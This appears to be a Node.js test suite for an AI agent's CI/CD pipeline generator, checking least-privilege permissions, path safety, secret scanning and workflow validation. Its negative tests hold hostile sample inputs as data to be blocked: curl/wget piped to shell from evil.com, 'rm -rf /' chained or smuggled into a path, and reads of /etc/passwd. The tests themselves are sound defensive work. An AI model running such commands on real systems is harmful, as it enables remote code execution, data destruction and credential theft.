'use strict';

/**
 * AI-Dost 2.0 — Phase 4E: CI/CD Pipeline Automation Suite
 * Canonical Capability: devops.ci_cd_pipeline (Capability #25)
 * 
 * Verifies all 50+ unit-level security, boundary, matrix, command, and permission rules.
 * Run: node --test tests/ciCdPipeline.test.js
 */

const { test, describe, before, after } = require('node:test');
const assert = require('node:assert/strict');
const path = require('path');
const fs = require('fs');

const {
  CiCdPlan,
  SUPPORTED_CI_PLATFORMS,
  SUPPORTED_RUNTIMES,
  ACTIVE_NODE_LTS_VERSIONS,
  SUPPORTED_TEST_FRAMEWORKS,
  SUPPORTED_DATABASE_ENGINES,
  OFFICIAL_ACTION_SHAS
} = require('../agent/capabilities/ciCdPipeline/CiCdPlan');

const {
  CiCdValidator
} = require('../agent/capabilities/ciCdPipeline/CiCdValidator');

const {
  CanonicalPipelineModel
} = require('../agent/capabilities/ciCdPipeline/CanonicalPipelineModel');

const {
  PipelineSynthesizer
} = require('../agent/capabilities/ciCdPipeline/PipelineSynthesizer');

const {
  GitHubActionsAdapter
} = require('../agent/capabilities/ciCdPipeline/GitHubActionsAdapter');

const {
  WorkflowSemanticValidator
} = require('../agent/capabilities/ciCdPipeline/WorkflowSemanticValidator');

const {
  generateCiCdPipeline,
  CiCdResult,
  CICD_STATUS
} = require('../agent/capabilities/ciCdPipeline');

const { capabilityRegistry, STATUS } = require('../agent/registry/CapabilityRegistry');
const { capabilityDiscovery, MATCH_TYPE } = require('../agent/registry/CapabilityDiscovery');
const { capabilityGatekeeper } = require('../agent/policy/CapabilityGatekeeper');

const FIXTURES_DIR = path.resolve(__dirname, '../temp/test-fixtures/ci-cd-unit');

describe('AI-Dost 2.0 — Phase 4E: CI/CD Pipeline Automation Suite', () => {

  before(() => {
    if (fs.existsSync(FIXTURES_DIR)) {
      fs.rmSync(FIXTURES_DIR, { recursive: true, force: true });
    }
    fs.mkdirSync(FIXTURES_DIR, { recursive: true });
  });

  after(() => {
    if (fs.existsSync(FIXTURES_DIR)) {
      fs.rmSync(FIXTURES_DIR, { recursive: true, force: true });
    }
  });

  // ==========================================
  // 1. REGISTRY, DISCOVERY & INTENT MATCHING
  // ==========================================

  test('1. Exact capability ID matching returns devops.ci_cd_pipeline with confidence 1.0', () => {
    const res = capabilityDiscovery.discover('devops.ci_cd_pipeline');
    assert.equal(res.matched.length, 1);
    assert.equal(res.matched[0].capability_id, 'devops.ci_cd_pipeline');
    assert.equal(res.matched[0].confidence, 1.0);
    assert.equal(res.matched[0].match_type, MATCH_TYPE.EXACT);
  });

  test('2. Canonical capability name match returns confidence 1.0', () => {
    const res = capabilityDiscovery.discover('CI/CD Pipeline Setup');
    assert.equal(res.matched.length, 1);
    assert.equal(res.matched[0].capability_id, 'devops.ci_cd_pipeline');
    assert.equal(res.matched[0].confidence, 1.0);
  });

  test('3. Target opt-in phrases resolve to devops.ci_cd_pipeline', () => {
    const phrases = [
      'setup github actions ci workflow',
      'create a ci/cd pipeline for this project',
      'automated deploy pipeline with tests',
      'configure github actions build pipeline'
    ];

    for (const phrase of phrases) {
      const res = capabilityDiscovery.discover(phrase);
      assert.ok(res.matched.some(m => m.capability_id === 'devops.ci_cd_pipeline'), `Should match: "${phrase}"`);
    }
  });

  test('4. Generic non-CI phrases do NOT match devops.ci_cd_pipeline', () => {
    const nonPhrases = [
      'write a poem about pipelines',
      'how does a water pipeline work',
      'create a resume for a developer'
    ];

    for (const phrase of nonPhrases) {
      const res = capabilityDiscovery.discover(phrase);
      assert.ok(!res.matched.some(m => m.capability_id === 'devops.ci_cd_pipeline'));
    }
  });

  test('5. Multi-intent request places devops.ci_cd_pipeline downstream of full-stack delivery', () => {
    const res = capabilityDiscovery.discover('create a full-stack project with github actions ci pipeline');
    assert.ok(res.matched.length >= 2);
    assert.equal(res.matched[0].capability_id, 'coding.full_stack_delivery');
    assert.ok(res.matched.some(m => m.capability_id === 'devops.ci_cd_pipeline'));
  });

  test('6. CapabilityRegistry marks devops.ci_cd_pipeline as STATUS.IMPLEMENTED with CONFIRM approval', () => {
    const cap = capabilityRegistry.getCapability('devops.ci_cd_pipeline');
    assert.ok(cap);
    assert.equal(cap.status, STATUS.IMPLEMENTED);
    assert.equal(cap.approval_policy, 'CONFIRM');
    assert.equal(cap.risk_level, 'MEDIUM');
  });

  // ==========================================
  // 2. CICD PLAN & IMMUTABILITY
  // ==========================================

  test('7. CiCdPlan normalizes defaults and assigns version 1.0.0', () => {
    const plan = new CiCdPlan();
    assert.ok(plan.planId.startsWith('plan_cicd_'));
    assert.equal(plan.platform, 'github_actions');
    assert.equal(plan.runtime, 'node');
    assert.equal(plan.installScriptPolicy, 'ignore-scripts');
    assert.equal(plan.actionPinningMode, 'sha');
    assert.deepEqual(plan.permissions, { contents: 'read' });
  });

  test('8. CiCdPlan freeze ensures deep immutability', () => {
    const plan = new CiCdPlan();
    assert.ok(Object.isFrozen(plan));
    assert.ok(Object.isFrozen(plan.triggers));
    assert.ok(Object.isFrozen(plan.stages));

    assert.throws(() => {
      plan.platform = 'gitlab';
    }, TypeError);
  });

  test('9. CiCdPlan clone creates detached deep copy with incremented planId', () => {
    const plan1 = new CiCdPlan({ projectId: 'app_v1' });
    const plan2 = plan1.clone({ projectId: 'app_v2' });

    assert.equal(plan1.projectId, 'app_v1');
    assert.equal(plan2.projectId, 'app_v2');
    assert.notEqual(plan1.planId, plan2.planId);
  });

  test('10. CiCdPlan toJSON produces clean serializable representation', () => {
    const plan = new CiCdPlan({ projectId: 'json_test' });
    const json = plan.toJSON();
    assert.equal(json.projectId, 'json_test');
    assert.equal(json.platform, 'github_actions');
    assert.deepEqual(json.permissions, { contents: 'read' });
  });

  // ==========================================
  // 3. PERMISSIONS & LEAST PRIVILEGE
  // ==========================================

  test('11. Structured permissions { contents: "read" } validates cleanly', () => {
    const plan = new CiCdPlan({ permissions: { contents: 'read' } });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, true);
  });

  test('12. Array permission ["read-all"] is rejected with INVALID_PIPELINE_PERMISSIONS', () => {
    const plan = new CiCdPlan({ permissions: ['read-all'] });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.equal(val.errors[0].code, 'INVALID_PIPELINE_PERMISSIONS');
  });

  test('13. String permission "write-all" is rejected with INVALID_PIPELINE_PERMISSIONS', () => {
    const plan = new CiCdPlan({ permissions: 'write-all' });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.equal(val.errors[0].code, 'INVALID_PIPELINE_PERMISSIONS');
  });

  test('14. Overly permissive write permission { contents: "write" } is rejected in default CI', () => {
    const plan = new CiCdPlan({ permissions: { contents: 'write' } });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.equal(val.errors[0].code, 'INVALID_PIPELINE_PERMISSIONS');
  });

  test('15. Unrecognized permission key is rejected with INVALID_PIPELINE_PERMISSIONS', () => {
    const plan = new CiCdPlan({ permissions: { superuser: 'read' } });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.equal(val.errors[0].code, 'INVALID_PIPELINE_PERMISSIONS');
  });

  // ==========================================
  // 4. PLATFORM, RUNTIME & PATH SAFETY
  // ==========================================

  test('16. Unsupported CI platform is rejected with UNSUPPORTED_CI_PLATFORM', () => {
    const plan = new CiCdPlan({ platform: 'jenkins' });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.equal(val.errors[0].code, 'UNSUPPORTED_CI_PLATFORM');
  });

  test('17. Unsupported runtime is rejected with UNSUPPORTED_RUNTIME', () => {
    const plan = new CiCdPlan({ runtime: 'ruby' });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.equal(val.errors[0].code, 'UNSUPPORTED_RUNTIME');
  });

  test('18. Path traversal in workflowOutputDir is rejected with PATH_TRAVERSAL_DETECTED', () => {
    const plan = new CiCdPlan({ workflowOutputDir: '../../etc/cron' });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.equal(val.errors[0].code, 'PATH_TRAVERSAL_DETECTED');
  });

  test('19. Dangerous shell characters in workflowOutputDir are rejected', () => {
    const plan = new CiCdPlan({ workflowOutputDir: '.github;rm -rf /' });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.equal(val.errors[0].code, 'DANGEROUS_PATH_CHARACTERS');
  });

  test('20. Mutable major tag mode emits MUTABLE_ACTION_TAG warning', () => {
    const plan = new CiCdPlan({ actionPinningMode: 'major_tag' });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, true);
    assert.ok(val.warnings.some(w => w.code === 'MUTABLE_ACTION_TAG'));
  });

  test('21. Standard install script policy emits UNSAFE_INSTALL_SCRIPTS audit warning', () => {
    const plan = new CiCdPlan({ installScriptPolicy: 'standard' });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, true);
    assert.ok(val.warnings.some(w => w.code === 'UNSAFE_INSTALL_SCRIPTS'));
  });

  test('22. Default install script policy is ignore-scripts', () => {
    const plan = new CiCdPlan();
    assert.equal(plan.installScriptPolicy, 'ignore-scripts');
  });

  test('23. Unsupported test framework is rejected with UNSUPPORTED_TEST_FRAMEWORK', () => {
    const plan = new CiCdPlan({ testFramework: 'cucumber' });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.equal(val.errors[0].code, 'UNSUPPORTED_TEST_FRAMEWORK');
  });

  test('24. Unsupported database engine is rejected with UNSUPPORTED_DATABASE_ENGINE', () => {
    const plan = new CiCdPlan({ databaseConfig: { engine: 'oracle' } });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.equal(val.errors[0].code, 'UNSUPPORTED_DATABASE_ENGINE');
  });

  test('25. Obsolete Node version (<18) is rejected with UNRESOLVED_RUNTIME_MATRIX', () => {
    const plan = new CiCdPlan({ nodeVersions: ['14.x', '16.x'] });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.equal(val.errors[0].code, 'UNRESOLVED_RUNTIME_MATRIX');
  });

  // ==========================================
  // 5. WORKSPACE DEPENDENCY INSPECTIONS
  // ==========================================

  test('26. Missing package-lock.json in workspace returns MISSING_LOCKFILE', () => {
    const fixtureDir = path.join(FIXTURES_DIR, 'no-lockfile');
    fs.mkdirSync(fixtureDir, { recursive: true });
    fs.writeFileSync(path.join(fixtureDir, 'package.json'), JSON.stringify({ name: 'test', scripts: { test: 'node --test' } }));

    const plan = new CiCdPlan({ workspacePath: fixtureDir });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.ok(val.errors.some(e => e.code === 'MISSING_LOCKFILE'));
  });

  test('27. Missing enabled lint script in package.json returns MISSING_REQUIRED_SCRIPT', () => {
    const fixtureDir = path.join(FIXTURES_DIR, 'no-lint');
    fs.mkdirSync(fixtureDir, { recursive: true });
    fs.writeFileSync(path.join(fixtureDir, 'package.json'), JSON.stringify({ name: 'test', scripts: { test: 'node --test', build: 'echo build' } }));
    fs.writeFileSync(path.join(fixtureDir, 'package-lock.json'), '{}');

    const plan = new CiCdPlan({ workspacePath: fixtureDir, stages: { lint: true, test: true, build: true } });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.ok(val.errors.some(e => e.code === 'MISSING_REQUIRED_SCRIPT' && e.message.includes('lint')));
  });

  test('28. Missing enabled test script in package.json returns MISSING_REQUIRED_SCRIPT', () => {
    const fixtureDir = path.join(FIXTURES_DIR, 'no-test');
    fs.mkdirSync(fixtureDir, { recursive: true });
    fs.writeFileSync(path.join(fixtureDir, 'package.json'), JSON.stringify({ name: 'test', scripts: { lint: 'eslint .', build: 'echo build' } }));
    fs.writeFileSync(path.join(fixtureDir, 'package-lock.json'), '{}');

    const plan = new CiCdPlan({ workspacePath: fixtureDir, stages: { lint: true, test: true, build: true } });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.ok(val.errors.some(e => e.code === 'MISSING_REQUIRED_SCRIPT' && e.message.includes('test')));
  });

  test('29. Missing enabled build script in package.json returns MISSING_REQUIRED_SCRIPT', () => {
    const fixtureDir = path.join(FIXTURES_DIR, 'no-build');
    fs.mkdirSync(fixtureDir, { recursive: true });
    fs.writeFileSync(path.join(fixtureDir, 'package.json'), JSON.stringify({ name: 'test', scripts: { lint: 'eslint .', test: 'node --test' } }));
    fs.writeFileSync(path.join(fixtureDir, 'package-lock.json'), '{}');

    const plan = new CiCdPlan({ workspacePath: fixtureDir, stages: { lint: true, test: true, build: true } });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.ok(val.errors.some(e => e.code === 'MISSING_REQUIRED_SCRIPT' && e.message.includes('build')));
  });

  test('30. Playwright framework with missing @playwright/test returns PLAYWRIGHT_DEPENDENCY_MISSING', () => {
    const fixtureDir = path.join(FIXTURES_DIR, 'no-playwright-dep');
    fs.mkdirSync(fixtureDir, { recursive: true });
    fs.writeFileSync(path.join(fixtureDir, 'package.json'), JSON.stringify({ name: 'test', scripts: { test: 'playwright test' }, dependencies: {} }));
    fs.writeFileSync(path.join(fixtureDir, 'package-lock.json'), '{}');

    const plan = new CiCdPlan({ workspacePath: fixtureDir, testFramework: 'playwright', stages: { lint: false, test: true, build: false } });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.ok(val.errors.some(e => e.code === 'PLAYWRIGHT_DEPENDENCY_MISSING'));
  });

  test('31. Ambiguous DB migration without migration script returns AMBIGUOUS_MIGRATION_COMMAND', () => {
    const fixtureDir = path.join(FIXTURES_DIR, 'no-migrate-script');
    fs.mkdirSync(fixtureDir, { recursive: true });
    fs.writeFileSync(path.join(fixtureDir, 'package.json'), JSON.stringify({ name: 'test', scripts: { test: 'node --test' } }));
    fs.writeFileSync(path.join(fixtureDir, 'package-lock.json'), '{}');

    const plan = new CiCdPlan({
      workspacePath: fixtureDir,
      stages: { lint: false, test: true, build: false, databaseMigration: true },
      databaseConfig: { engine: 'postgresql' }
    });
    const val = CiCdValidator.validatePlan(plan);
    assert.equal(val.ok, false);
    assert.ok(val.errors.some(e => e.code === 'AMBIGUOUS_MIGRATION_COMMAND'));
  });

  // ==========================================
  // 6. COMMAND & SECRET SAFETY
  // ==========================================

  test('32. validateCommand passes safe commands', () => {
    assert.equal(CiCdValidator.validateCommand('npm ci --ignore-scripts'), true);
    assert.equal(CiCdValidator.validateCommand('npm test'), true);
    assert.equal(CiCdValidator.validateCommand('npm run build'), true);
    assert.equal(CiCdValidator.validateCommand('npx playwright install --with-deps chromium'), true);
  });

  test('33. validateCommand blocks dangerous curl | bash and wget | sh', () => {
    assert.equal(CiCdValidator.validateCommand('curl http://evil.com/setup.sh | bash'), false);
    assert.equal(CiCdValidator.validateCommand('wget http://evil.com/setup.sh | sh'), false);
  });

  test('34. validateCommand blocks bash -c, sh -c, node -e, python -c', () => {
    assert.equal(CiCdValidator.validateCommand('bash -c "echo hacked"'), false);
    assert.equal(CiCdValidator.validateCommand('sh -c "echo hacked"'), false);
    assert.equal(CiCdValidator.validateCommand('node -e "process.exit(1)"'), false);
    assert.equal(CiCdValidator.validateCommand('python -c "import os; os.system(\'id\')"'), false);
  });

  test('35. validateCommand blocks command chaining and backticks', () => {
    assert.equal(CiCdValidator.validateCommand('npm test; rm -rf /'), false);
    assert.equal(CiCdValidator.validateCommand('npm test && curl evil.com'), false);
    assert.equal(CiCdValidator.validateCommand('`cat /etc/passwd`'), false);
    assert.equal(CiCdValidator.validateCommand('$(cat /etc/passwd)'), false);
  });

  test('36. scanForSecrets detects hardcoded AWS keys, private keys, and credential-bearing URLs', () => {
    const yamlWithAws = 'env:\n  KEY: AKIAIOSFODNN7EXAMPLE\n';
    assert.ok(CiCdValidator.scanForSecrets(yamlWithAws).length > 0);

    const yamlWithPrivKey = 'env:\n  CERT: |-\n    -----BEGIN RSA PRIVATE KEY-----\n';
    assert.ok(CiCdValidator.scanForSecrets(yamlWithPrivKey).length > 0);

    const yamlWithCredUrl = 'env:\n  DB: postgres://admin:secret123@prod.db.com/prod\n';
    assert.ok(CiCdValidator.scanForSecrets(yamlWithCredUrl).length > 0);
  });

  // ==========================================
  // 7. CANONICAL PIPELINE MODEL & SYNTHESIZER
  // ==========================================

  test('37. CanonicalPipelineModel constructor validates structured permissions and freezes instance', () => {
    const cpm = new CanonicalPipelineModel({
      pipelineName: 'Test CPM',
      permissions: { contents: 'read' },
      stages: [{ id: 'checkout', name: 'Checkout', type: 'ACTION', action: 'actions/checkout@v4' }]
    });

    assert.equal(cpm.pipelineName, 'Test CPM');
    assert.deepEqual(cpm.permissions, { contents: 'read' });
    assert.ok(Object.isFrozen(cpm));
  });

  test('38. PipelineSynthesizer resolves safe Node matrix from engines.node', () => {
    const pkg1 = { engines: { node: '>=20.0.0' } };
    const matrix1 = PipelineSynthesizer.resolveNodeMatrix(new CiCdPlan(), pkg1);
    assert.deepEqual(matrix1, ['20.x', '22.x']);

    const pkg2 = { engines: { node: '>=18.0.0' } };
    const matrix2 = PipelineSynthesizer.resolveNodeMatrix(new CiCdPlan(), pkg2);
    assert.deepEqual(matrix2, ['18.x', '20.x', '22.x']);
  });

  test('39. PipelineSynthesizer throws UNRESOLVED_RUNTIME_MATRIX on obsolete engines range', () => {
    const pkg = { engines: { node: '<16.0.0' } };
    assert.throws(() => {
      PipelineSynthesizer.resolveNodeMatrix(new CiCdPlan(), pkg);
    }, (err) => err.code === 'UNRESOLVED_RUNTIME_MATRIX');
  });

  test('40. PipelineSynthesizer derives node:test command WITHOUT --ci', () => {
    const testInfo = PipelineSynthesizer.resolveTestExecution(new CiCdPlan({ testFramework: 'node:test' }), {}, { test: 'node --test' }, {});
    assert.equal(testInfo.framework, 'node:test');
    assert.equal(testInfo.testCommand, 'npm test');
  });

  test('41. PipelineSynthesizer derives jest command WITH --ci', () => {
    const testInfo = PipelineSynthesizer.resolveTestExecution(new CiCdPlan({ testFramework: 'jest' }), {}, { test: 'jest' }, {});
    assert.equal(testInfo.framework, 'jest');
    assert.equal(testInfo.testCommand, 'npm test -- --ci');
  });

  test('42. PipelineSynthesizer derives playwright command with local test runner', () => {
    const testInfo = PipelineSynthesizer.resolveTestExecution(new CiCdPlan({ testFramework: 'playwright' }), {}, { 'test:e2e': 'playwright test' }, { '@playwright/test': '^1.0.0' });
    assert.equal(testInfo.framework, 'playwright');
    assert.equal(testInfo.testCommand, 'npm run test:e2e');
    assert.equal(testInfo.isPlaywright, true);
  });

  test('43. PipelineSynthesizer handles SQLite with zero container service and file-based URL', () => {
    const db = PipelineSynthesizer.resolveDatabaseService(new CiCdPlan({ databaseConfig: { engine: 'sqlite' } }), {}, {}, {});
    assert.equal(db.engine, 'sqlite');
    assert.equal(db.serviceContainer, null);
    assert.equal(db.env.DATABASE_URL, 'file:./dev.db');
  });

  test('44. PipelineSynthesizer synthesizes PostgreSQL ephemeral service with pg_isready probe', () => {
    const db = PipelineSynthesizer.resolveDatabaseService(new CiCdPlan({ databaseConfig: { engine: 'postgresql' } }), {}, {}, {});
    assert.equal(db.engine, 'postgresql');
    assert.ok(db.serviceContainer);
    assert.equal(db.serviceContainer.image, 'postgres:16-alpine');
    assert.ok(db.serviceContainer.options.includes('pg_isready'));
  });

  test('45. PipelineSynthesizer synthesizes MySQL ephemeral service with mysqladmin ping probe', () => {
    const db = PipelineSynthesizer.resolveDatabaseService(new CiCdPlan({ databaseConfig: { engine: 'mysql' } }), {}, {}, {});
    assert.equal(db.engine, 'mysql');
    assert.ok(db.serviceContainer);
    assert.equal(db.serviceContainer.image, 'mysql:8.0');
    assert.ok(db.serviceContainer.options.includes('mysqladmin ping'));
  });

  test('46. PipelineSynthesizer flags driver without schema as AMBIGUOUS_DATABASE_CONFIGURATION', () => {
    assert.throws(() => {
      PipelineSynthesizer.resolveDatabaseService(new CiCdPlan({ stages: { databaseMigration: true } }), {}, {}, { pg: '^8.0.0' });
    }, (err) => err.code === 'AMBIGUOUS_DATABASE_CONFIGURATION');
  });

  // ==========================================
  // 8. GITHUB ACTIONS ADAPTER & SEMANTIC VALIDATION
  // ==========================================

  test('47. GitHubActionsAdapter maps pullRequest to pull_request deterministically', () => {
    const plan = new CiCdPlan();
    const cpm = PipelineSynthesizer.synthesize(plan);
    const yaml = GitHubActionsAdapter.generateWorkflowYaml(cpm, plan);

    assert.ok(yaml.includes('pull_request:'));
    assert.ok(yaml.includes('push:'));
    assert.ok(!yaml.includes('pullRequest:')); // Must be mapped to snake_case
  });

  test('48. GitHubActionsAdapter pins official actions with 40-character commit SHAs', () => {
    const plan = new CiCdPlan({ actionPinningMode: 'sha' });
    const cpm = PipelineSynthesizer.synthesize(plan);
    const yaml = GitHubActionsAdapter.generateWorkflowYaml(cpm, plan);

    assert.ok(yaml.includes(`actions/checkout@${OFFICIAL_ACTION_SHAS['actions/checkout']}`));
    assert.ok(yaml.includes(`actions/setup-node@${OFFICIAL_ACTION_SHAS['actions/setup-node']}`));
  });

  test('49. GitHubActionsAdapter prevents duplicate caching between setup-node and actions/cache', () => {
    const plan = new CiCdPlan();
    const cpm = PipelineSynthesizer.synthesize(plan);
    const yaml = GitHubActionsAdapter.generateWorkflowYaml(cpm, plan);

    assert.ok(yaml.includes('cache: npm'));
    assert.ok(!yaml.includes('actions/cache@')); // No duplicate standalone cache step
  });

  test('50. GitHubActionsAdapter synthesizes inert deployment template with .template extension', () => {
    const plan = new CiCdPlan({ stages: { deploymentTemplate: true } });
    const cpm = PipelineSynthesizer.synthesize(plan);
    const templateYaml = GitHubActionsAdapter.generateDeploymentTemplate(cpm, plan);

    assert.ok(templateYaml.includes('INERT NOTICE:'));
    assert.ok(templateYaml.includes('${{ secrets.DATABASE_URL }}'));
    assert.ok(templateYaml.includes('${{ secrets.APP_SECRET }}'));
  });

  test('51. WorkflowSemanticValidator validates clean YAML and checks required top-level keys', () => {
    const plan = new CiCdPlan();
    const cpm = PipelineSynthesizer.synthesize(plan);
    const yaml = GitHubActionsAdapter.generateWorkflowYaml(cpm, plan);

    const val = WorkflowSemanticValidator.validate(yaml);
    assert.equal(val.valid, true);
    assert.equal(val.errors.length, 0);
  });

  test('52. WorkflowSemanticValidator rejects unallowlisted third-party actions', () => {
    const maliciousYaml = `
name: Malicious Workflow
on: [push]
permissions:
  contents: read
jobs:
  job1:
    runs-on: ubuntu-latest
    steps:
      - name: Evil Action
        uses: evil-org/hack-action@v1
`;
    const val = WorkflowSemanticValidator.validate(maliciousYaml);
    assert.equal(val.valid, false);
    assert.ok(val.errors.some(e => e.includes('Unverified third-party action')));
  });

  test('53. WorkflowSemanticValidator enforces mutual exclusivity of uses: and run:', () => {
    const badStepYaml = `
name: Bad Step Workflow
on: [push]
permissions:
  contents: read
jobs:
  job1:
    runs-on: ubuntu-latest
    steps:
      - name: Conflicting Step
        uses: actions/checkout@v4
        run: echo "conflict"
`;
    const val = WorkflowSemanticValidator.validate(badStepYaml);
    assert.equal(val.valid, false);
    assert.ok(val.errors.some(e => e.includes('cannot define both "uses:" and "run:"')));
  });

  test('54. CapabilityGatekeeper evaluates devops.ci_cd_pipeline as REQUIRE_CONFIRMATION and consumes token', () => {
    const evalRes = capabilityGatekeeper.evaluate('devops.ci_cd_pipeline', {
      requestId: 'req_cicd_test_1',
      planId: 'plan_cicd_test_1',
      permissions: ['workspace:write']
    });

    assert.equal(evalRes.decision, 'REQUIRE_CONFIRMATION');
    assert.ok(evalRes.approval_token);

    const token = evalRes.approval_token;
    const val1 = capabilityGatekeeper.validateApproval({
      token,
      requestId: 'req_cicd_test_1',
      planId: 'plan_cicd_test_1',
      capabilityIds: ['devops.ci_cd_pipeline']
    });
    assert.equal(val1.valid, true);

    // Replay rejection
    const val2 = capabilityGatekeeper.validateApproval({
      token,
      requestId: 'req_cicd_test_1',
      planId: 'plan_cicd_test_1',
      capabilityIds: ['devops.ci_cd_pipeline']
    });
    assert.equal(val2.valid, false);
  });

  test('55. generateCiCdPipeline creates complete workflow bundle with valid checksums', async () => {
    const plan = new CiCdPlan({
      projectId: 'full_cicd_bundle',
      stages: { lint: false, test: false, build: false, deploymentTemplate: true }
    });

    const result = await generateCiCdPipeline(plan);
    assert.equal(result.ok, true);
    assert.equal(result.status, CICD_STATUS.GENERATED);
    assert.equal(result.files.length, 2); // ci.yml and deploy.yml.template

    const ciFile = result.files.find(f => f.type === 'CI_WORKFLOW');
    const deployFile = result.files.find(f => f.type === 'DEPLOYMENT_TEMPLATE');

    assert.ok(ciFile);
    assert.ok(deployFile);
    assert.equal(ciFile.checksum.length, 64);
    assert.equal(deployFile.checksum.length, 64);
  });

});
